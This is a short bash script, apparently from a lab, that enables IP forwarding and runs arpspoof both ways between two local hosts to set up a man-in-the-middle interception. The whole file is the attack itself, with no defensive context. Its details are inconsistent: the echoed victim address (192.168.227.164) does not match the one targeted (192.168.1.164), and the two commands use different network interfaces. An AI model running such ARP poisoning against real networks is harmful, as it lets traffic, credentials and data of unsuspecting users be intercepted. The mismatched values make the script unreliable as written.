 #!/bin/bash
   echo "Enabling IP forwarding..."
   sudo sysctl -w net.ipv4.ip_forward=1
   echo "Poisoning Victim (192.168.227.164)..."
   sudo arpspoof -i ens33 -t 192.168.1.93 -r 192.168.1.164 &
   echo "Poisoning Target (192.168.1.93)..."
   sudo arpspoof -i eth0 -t 192.168.1.164 -r 192.168.1.93
